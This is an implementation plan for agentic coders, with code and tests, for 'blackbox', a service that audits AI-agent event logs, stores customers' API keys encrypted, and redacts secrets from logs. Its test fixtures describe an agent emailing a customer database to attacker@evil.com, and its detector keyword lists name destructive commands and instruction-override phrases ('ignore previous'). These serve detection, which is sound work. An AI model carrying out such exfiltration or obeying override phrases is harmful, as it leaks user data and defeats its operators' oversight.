# Plan 3 — BYOK + Audit Hardening

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development or
> superpowers:executing-plans. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Let each customer store their own Anthropic key (encrypted at rest) and have the
tribunal run on it; guarantee a decrypted key never reaches logs; and serialize concurrent
`/audit` calls so two clicks can't double-spend the customer's credits.

**Architecture:** `cryptography.Fernet` (AES) encrypts the key under a server master key
(`BLACKBOX_SECRET_KEY`); plaintext lives only in a local variable during one audit. A global
`logging.Filter` masks `sk-ant-…`/`bb_live_…` in every record. `/audit` acquires a Postgres
advisory transaction lock keyed on `(org_id, session_id)` so the loser of a race returns the
winner's verdicts instead of launching a second tribunal. No BYOK key → deterministic offline
detector (no LLM, no cost).

**Tech Stack:** cryptography (Fernet), psycopg3 advisory locks, LangGraph, pytest.

**Depends on:** Plan 1 (Store) and Plan 2 (orgs, current_org, ingest).

**Test env:** add `BLACKBOX_SECRET_KEY` to `tests/conftest.py` (a fixed Fernet key for tests).

---

### Task 1: Encryption module + BYOK secret storage

**Files:**
- Modify: `pyproject.toml`, `requirements.txt`
- Create: `blackbox/crypto.py`
- Create: `migrations/0003_byok.sql`
- Create: `blackbox/byok.py`
- Modify: `tests/conftest.py` (add `BLACKBOX_SECRET_KEY`)
- Test: `tests/test_byok.py`

- [ ] **Step 1: Add the dependency + test key**

`pyproject.toml` dependencies, add:
```toml
    "cryptography>=42.0",
```
`requirements.txt`, add:
```
cryptography>=42.0
```
Install: `pip install -e ".[dev]"`
In `tests/conftest.py` top env block, add a deterministic test key (valid Fernet key):
```python
os.environ.setdefault("BLACKBOX_SECRET_KEY", "8sJ8m1bXh2pT0v9w3yQ5rZ6kN4lP7cA1dE2fG3hI4k=")
```

- [ ] **Step 2: Write the migration**

Create `migrations/0003_byok.sql`:
```sql
-- 0003: encrypted bring-your-own-key secrets
CREATE TABLE IF NOT EXISTS byok_secrets (
    org_id     TEXT NOT NULL REFERENCES orgs(id) ON DELETE CASCADE,
    provider   TEXT NOT NULL DEFAULT 'anthropic',
    ciphertext TEXT NOT NULL,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    PRIMARY KEY (org_id, provider)
);
ALTER TABLE byok_secrets ENABLE ROW LEVEL SECURITY;
```

- [ ] **Step 3: Write the failing test**

Create `tests/test_byok.py`:
```python
import pytest
from blackbox.crypto import encrypt, decrypt
from blackbox.byok import set_byok, get_byok, clear_byok, has_byok
from blackbox.orgs import create_org
from blackbox.db import get_pool

def test_encrypt_roundtrip():
    ct = encrypt("sk-ant-secret123")
    assert ct != "sk-ant-secret123"
    assert decrypt(ct) == "sk-ant-secret123"

def test_wrong_key_cannot_decrypt(monkeypatch):
    ct = encrypt("sk-ant-secret123")
    monkeypatch.setenv("BLACKBOX_SECRET_KEY", "0000000000000000000000000000000000000000000=")
    with pytest.raises(Exception):
        decrypt(ct)

def test_set_get_clear_byok(store):
    org = create_org("Acme", "u1")
    assert has_byok(org) is False
    set_byok(org, "anthropic", "sk-ant-live-xyz")
    assert has_byok(org) is True
    assert get_byok(org) == "sk-ant-live-xyz"
    clear_byok(org)
    assert get_byok(org) is None

def test_ciphertext_at_rest_is_not_plaintext(store):
    org = create_org("Acme", "u1")
    set_byok(org, "anthropic", "sk-ant-PLAINTEXT")
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("SELECT ciphertext FROM byok_secrets WHERE org_id=%s", (org,))
        stored = cur.fetchone()[0]
    assert "sk-ant-PLAINTEXT" not in stored
```

- [ ] **Step 4: Run to verify fail**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_byok.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'blackbox.crypto'`

- [ ] **Step 5: Implement crypto + byok**

Create `blackbox/crypto.py`:
```python
# blackbox/blackbox/crypto.py
import os
from cryptography.fernet import Fernet

def _fernet() -> Fernet:
    key = os.environ["BLACKBOX_SECRET_KEY"]
    return Fernet(key.encode("utf-8") if isinstance(key, str) else key)

def encrypt(plaintext: str) -> str:
    return _fernet().encrypt(plaintext.encode("utf-8")).decode("utf-8")

def decrypt(ciphertext: str) -> str:
    return _fernet().decrypt(ciphertext.encode("utf-8")).decode("utf-8")
```
Create `blackbox/byok.py`:
```python
# blackbox/blackbox/byok.py
from typing import Optional
from .db import get_pool
from .crypto import encrypt, decrypt

def set_byok(org_id: str, provider: str, plaintext: str) -> None:
    ct = encrypt(plaintext)
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute(
            "INSERT INTO byok_secrets(org_id,provider,ciphertext) VALUES(%s,%s,%s) "
            "ON CONFLICT (org_id,provider) DO UPDATE SET ciphertext=EXCLUDED.ciphertext, created_at=now()",
            (org_id, provider, ct))
        conn.commit()

def get_byok(org_id: str, provider: str = "anthropic") -> Optional[str]:
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("SELECT ciphertext FROM byok_secrets WHERE org_id=%s AND provider=%s",
                    (org_id, provider))
        row = cur.fetchone()
    return decrypt(row[0]) if row else None

def has_byok(org_id: str, provider: str = "anthropic") -> bool:
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("SELECT 1 FROM byok_secrets WHERE org_id=%s AND provider=%s", (org_id, provider))
        return cur.fetchone() is not None

def clear_byok(org_id: str, provider: str = "anthropic") -> None:
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("DELETE FROM byok_secrets WHERE org_id=%s AND provider=%s", (org_id, provider))
        conn.commit()
```

- [ ] **Step 6: Run to verify pass + commit**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_byok.py -v`
Expected: PASS
```bash
git add pyproject.toml requirements.txt blackbox/crypto.py blackbox/byok.py migrations/0003_byok.sql tests/conftest.py tests/test_byok.py
git commit -m "feat: encrypted BYOK secret storage (Fernet at rest, plaintext never persisted)"
```

---

### Task 2: Secret-redaction log filter

**Files:**
- Create: `blackbox/logging_filter.py`
- Test: `tests/test_logging_filter.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_logging_filter.py`:
```python
import logging, io
from blackbox.logging_filter import SecretRedactionFilter

def _logger_capturing():
    buf = io.StringIO()
    logger = logging.getLogger("blackbox.test.redact")
    logger.handlers.clear()
    h = logging.StreamHandler(buf)
    h.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(h)
    logger.addFilter(SecretRedactionFilter())
    logger.setLevel(logging.INFO)
    return logger, buf

def test_redacts_anthropic_key_in_message():
    logger, buf = _logger_capturing()
    logger.info("calling claude with sk-ant-abc123DEF456 now")
    out = buf.getvalue()
    assert "sk-ant-abc123DEF456" not in out and "[REDACTED]" in out

def test_redacts_api_key_in_args():
    logger, buf = _logger_capturing()
    logger.info("key=%s", "bb_live_TOPSECRETzzz")
    out = buf.getvalue()
    assert "bb_live_TOPSECRETzzz" not in out
```

- [ ] **Step 2: Run to verify fail**

Run: `pytest tests/test_logging_filter.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement**

Create `blackbox/logging_filter.py`:
```python
# blackbox/blackbox/logging_filter.py
import logging, re

_PATTERNS = [
    re.compile(r"sk-ant-[A-Za-z0-9_\-]+"),
    re.compile(r"bb_live_[A-Za-z0-9_\-]+"),
]

def _redact(value):
    if isinstance(value, str):
        for p in _PATTERNS:
            value = p.sub("[REDACTED]", value)
    return value

class SecretRedactionFilter(logging.Filter):
    """Strip Anthropic keys and bb_live API keys from every log record, including args."""
    def filter(self, record: logging.LogRecord) -> bool:
        if isinstance(record.msg, str):
            record.msg = _redact(record.msg)
        if record.args:
            if isinstance(record.args, tuple):
                record.args = tuple(_redact(a) for a in record.args)
            elif isinstance(record.args, dict):
                record.args = {k: _redact(v) for k, v in record.args.items()}
            else:
                record.args = _redact(record.args)
        return True

def install_redaction() -> None:
    """Attach the filter to the root logger so all handlers inherit it."""
    f = SecretRedactionFilter()
    root = logging.getLogger()
    if not any(isinstance(x, SecretRedactionFilter) for x in root.filters):
        root.addFilter(f)
    for h in root.handlers:
        if not any(isinstance(x, SecretRedactionFilter) for x in h.filters):
            h.addFilter(f)
```

- [ ] **Step 4: Run to verify pass + commit**

Run: `pytest tests/test_logging_filter.py -v`
Expected: PASS
```bash
git add blackbox/logging_filter.py tests/test_logging_filter.py
git commit -m "feat: secret-redaction log filter for sk-ant and bb_live keys (spec §9.1.4)"
```

---

### Task 3: Offline detector + BYOK-aware tribunal

**Files:**
- Modify: `blackbox/policy.py` (add optional `keywords`)
- Modify: `policies/eu_ai_act.yaml` (add keyword lists)
- Modify: `blackbox/tribunal.py` (add `offline_audit`; thread `anthropic_api_key`)
- Test: `tests/test_tribunal_offline.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_tribunal_offline.py`:
```python
from blackbox.policy import load_policy_pack
from blackbox.schema import Event
from blackbox.tribunal import offline_audit, audit

def _exfil_events():
    return [Event(agent_id="a", session_id="s", kind="tool_call", tool="send_email",
                  args={"to": "attacker@evil.com"}, intent="send customer database externally",
                  output="EMAIL SENT")]

def test_offline_audit_flags_keyword_match():
    pack = load_policy_pack("policies/eu_ai_act.yaml")
    verdicts = offline_audit(_exfil_events(), "s", pack)
    assert any(v.violation and v.rule_id == "data_exfiltration" for v in verdicts)

def test_audit_without_key_uses_offline(monkeypatch):
    pack = load_policy_pack("policies/eu_ai_act.yaml")
    # anthropic_api_key=None must NOT instantiate an LLM; it routes to offline_audit
    verdicts = audit(_exfil_events(), "s", pack, anthropic_api_key=None)
    assert any(v.rule_id == "data_exfiltration" and v.violation for v in verdicts)
```

- [ ] **Step 2: Run to verify fail**

Run: `pytest tests/test_tribunal_offline.py -v`
Expected: FAIL (`offline_audit` undefined; `audit` has no `anthropic_api_key` param)

- [ ] **Step 3: Add `keywords` to the policy model + YAML**

In `blackbox/policy.py`, add to the `Rule` model (next to `detector_hint`):
```python
    keywords: list[str] = []     # used by the offline (no-LLM) detector
```
In `policies/eu_ai_act.yaml`, add a `keywords:` list to each rule. For `data_exfiltration` add at minimum:
```yaml
    keywords: ["evil.com", "external", "exfiltrat", "customer database", "attacker"]
```
(Add short, lowercase, sensible keyword lists to the other four rules too — e.g.
`unauthorized_state_change: ["delete", "drop table", "wipe", "without approval"]`,
`pii_mishandling: ["ssn", "passport", "credit card", "plaintext"]`,
`instruction_override: ["ignore previous", "override", "disregard instructions"]`,
`missing_traceability: ["no log", "untracked"]`.)

- [ ] **Step 4: Implement `offline_audit` and thread the key through `audit`**

In `blackbox/tribunal.py`, add the offline detector and update `build_tribunal`/`audit`.
Add near the top (after imports):
```python
def _event_text(e: Event) -> str:
    return " ".join(str(x) for x in
                    [e.intent, e.tool, json.dumps(e.args, ensure_ascii=False), e.output]).lower()

def offline_audit(events: list[Event], session_id: str, pack: PolicyPack) -> list[Verdict]:
    """Deterministic, no-LLM detector: flag a rule if any of its keywords appears in the log.
    Used when the org has no BYOK key configured."""
    blob = " ".join(_event_text(e) for e in events)
    seqs = [e.seq for e in events if e.seq is not None]
    out: list[Verdict] = []
    for rule in pack.rules:
        hit = any(kw.lower() in blob for kw in getattr(rule, "keywords", []))
        if hit:
            out.append(Verdict(session_id=session_id, rule_id=rule.id, severity=rule.severity,
                               violation=True, confidence=0.5, evidence_seqs=seqs,
                               rationale=f"[offline] matched keyword for {rule.id}",
                               framework_ref=rule.framework_ref))
    return out
```
Update `run_lens` to accept a key:
```python
def run_lens(rule: Rule, events: list[Event], session_id: str, llm=None,
             anthropic_api_key: str | None = None) -> Verdict:
    llm = llm or ChatAnthropic(model=LENS_MODEL, temperature=0, api_key=anthropic_api_key)
    ...  # rest unchanged
```
Update `build_tribunal` to capture the key in the closure:
```python
def build_tribunal(pack: PolicyPack, anthropic_api_key: str | None = None):
    g = StateGraph(TribunalState)
    def make_lens(rule: Rule):
        def _node(state: TribunalState):
            v = run_lens(rule, state["events"], state["session_id"],
                         anthropic_api_key=anthropic_api_key)
            return {"verdicts": [v]}
        return _node
    ...  # rest unchanged
```
Update `audit` to route to offline when no key:
```python
def audit(events: list[Event], session_id: str, pack: PolicyPack,
          anthropic_api_key: str | None = None) -> list[Verdict]:
    if not anthropic_api_key:
        return offline_audit(events, session_id, pack)
    graph = build_tribunal(pack, anthropic_api_key=anthropic_api_key)
    result = graph.invoke({"events": events, "session_id": session_id, "verdicts": []})
    final = consolidate([v for v in result["verdicts"]])
    return [v for v in final if v.violation]
```

- [ ] **Step 5: Run to verify pass**

Run: `pytest tests/test_tribunal_offline.py tests/test_tribunal.py -v`
Expected: PASS (existing `consolidate` tests still pass; offline tests pass)

- [ ] **Step 6: Commit**

```bash
git add blackbox/policy.py policies/eu_ai_act.yaml blackbox/tribunal.py tests/test_tribunal_offline.py
git commit -m "feat: offline keyword detector + BYOK-aware tribunal (no key -> deterministic audit)"
```

---

### Task 4: DB-backed `/audit` execution lock + wire BYOK into the endpoint

**Files:**
- Create: `blackbox/auditlock.py`
- Modify: `blackbox/ingest.py` (`/audit` uses the lock + BYOK; add `/byok` endpoints; install redaction)
- Test: `tests/test_audit_lock.py`, extend `tests/test_api.py`

- [ ] **Step 1: Write the failing concurrency test**

Create `tests/test_audit_lock.py`:
```python
import threading, time
from blackbox.auditlock import audited_run
from blackbox.store import Store
from blackbox.schema import Event, Verdict
from blackbox.orgs import create_org
import blackbox.auditlock as auditlock

def _seed(store, org, session="s1"):
    store.append(org, Event(agent_id="a", session_id=session, kind="tool_call",
                            tool="send_email", args={"to": "attacker@evil.com"}, intent="exfil"))

def test_concurrent_audits_run_tribunal_once(store, monkeypatch):
    org = create_org("Acme", "u1")
    _seed(store, org)
    calls = {"n": 0}
    def fake_audit(events, session_id, pack, anthropic_api_key=None):
        calls["n"] += 1
        time.sleep(0.4)   # widen the race window
        return [Verdict(session_id=session_id, rule_id="data_exfiltration", severity="critical",
                        violation=True, confidence=0.9, evidence_seqs=[1])]
    monkeypatch.setattr(auditlock, "audit", fake_audit)

    results = []
    def go():
        results.append(audited_run(store, org, "s1", pack=object(), api_key="sk-ant-x"))
    t1, t2 = threading.Thread(target=go), threading.Thread(target=go)
    t1.start(); t2.start(); t1.join(); t2.join()

    assert calls["n"] == 1                       # tribunal ran exactly once
    assert all(len(r) == 1 for r in results)     # both callers got the verdict
```

- [ ] **Step 2: Run to verify fail**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_audit_lock.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'blackbox.auditlock'`

- [ ] **Step 3: Implement the lock**

Create `blackbox/auditlock.py`:
```python
# blackbox/blackbox/auditlock.py
from .tribunal import audit   # imported at module scope so tests can monkeypatch it here

def audited_run(store, org_id: str, session_id: str, pack, api_key: str | None):
    """Serialize per (org_id, session_id) with a Postgres advisory xact lock so two concurrent
    audits cannot both run the tribunal and double-spend the customer's BYOK credits."""
    lock_key = f"{org_id}:{session_id}"
    with store.pool.connection() as conn:
        with conn.cursor() as cur:
            # blocks until any concurrent holder for the same key commits/rolls back
            cur.execute("SELECT pg_advisory_xact_lock(hashtext(%s))", (lock_key,))
        # now inside the critical section — re-check idempotently
        existing = [v for v in store.verdicts(org_id, session_id) if v.violation]
        if existing:
            conn.commit()   # release lock
            return existing
        events = store.events(org_id, session_id)
        verdicts = audit(events, session_id, pack, anthropic_api_key=api_key)
        for v in verdicts:
            store.add_verdict(org_id, v)
        conn.commit()        # release lock
    return verdicts
```

- [ ] **Step 4: Run to verify pass**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_audit_lock.py -v`
Expected: PASS (`calls['n'] == 1`)

- [ ] **Step 5: Wire `/audit` + `/byok` + redaction into ingest**

In `blackbox/ingest.py`:
- Add imports:
```python
from .byok import set_byok, get_byok, clear_byok, has_byok
from .auditlock import audited_run
from .logging_filter import install_redaction
from fastapi import Body
```
- Right after `app = FastAPI(...)`, install redaction:
```python
install_redaction()
```
- Replace the `audit_session` function body to use the lock + BYOK:
```python
@app.post("/audit/{session_id}")
def audit_session(session_id: str, org_id: str = Depends(current_org)) -> list[Verdict]:
    api_key = get_byok(org_id, "anthropic")   # None -> offline deterministic audit
    return audited_run(store, org_id, session_id, _pack, api_key)
```
- Add BYOK management endpoints (JWT):
```python
@app.put("/byok")
def put_byok(key: str = Body(embed=True), org_id: str = Depends(current_org)) -> dict:
    set_byok(org_id, "anthropic", key)
    return {"configured": True}

@app.get("/byok")
def get_byok_status(org_id: str = Depends(current_org)) -> dict:
    return {"configured": has_byok(org_id, "anthropic")}   # never returns the key itself

@app.delete("/byok")
def delete_byok(org_id: str = Depends(current_org)) -> dict:
    clear_byok(org_id, "anthropic")
    return {"configured": False}
```

- [ ] **Step 6: Extend the API test**

Add to `tests/test_api.py`:
```python
def test_byok_status_and_offline_audit(client):
    org = create_org("Acme", "u1")
    key = create_api_key(org, "ci")
    h = {"Authorization": f"Bearer {_jwt('u1')}"}
    client.post("/events", json={"agent_id": "a", "session_id": "x", "kind": "tool_call",
                "tool": "send_email", "args": {"to": "attacker@evil.com"}, "intent": "exfil"},
                headers={"Authorization": f"Bearer {key}"})
    assert client.get("/byok", headers=h).json()["configured"] is False
    r = client.post("/audit/x", headers=h)        # no BYOK -> offline detector
    assert r.status_code == 200
    assert any(v["rule_id"] == "data_exfiltration" and v["violation"] for v in r.json())
```
Also add `byok_secrets` to the TRUNCATE in `_clean_db`:
```python
        cur.execute("TRUNCATE events, verdicts, api_keys, byok_secrets, org_members, orgs "
                    "RESTART IDENTITY CASCADE")
```

- [ ] **Step 7: Run the full suite + commit**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest -v`
Expected: PASS
```bash
git add blackbox/auditlock.py blackbox/ingest.py tests/test_audit_lock.py tests/test_api.py
git commit -m "feat: advisory-locked /audit (no double-spend) + BYOK endpoints + global redaction"
```

---

## Plan 3 self-review

- **Spec coverage:** §6 BYOK (encrypt at rest, in-memory decrypt, offline fallback) ✓ T1/T3;
  §9.1.2 audit execution lock ✓ T4; §9.1.4 redaction filter ✓ T2 + installed in ingest T4.
- **Type consistency:** `encrypt/decrypt(str)->str`; `set_byok(org_id,provider,plaintext)`,
  `get_byok(org_id,provider)->Optional[str]`, `has_byok`, `clear_byok`; `audit(events,
  session_id,pack,anthropic_api_key=None)`; `audited_run(store,org_id,session_id,pack,api_key)`;
  `offline_audit(events,session_id,pack)` — used identically in tests and ingest.
- **No placeholders:** every step has runnable code, commands, and expected output. The keyword
  lists are specified concretely for `data_exfiltration` and sketched for the other four with
  exact example values.
- **Note for executor:** `audited_run` imports `audit` at module scope so the concurrency test
  can `monkeypatch.setattr(auditlock, "audit", ...)`. Keep that import shape.
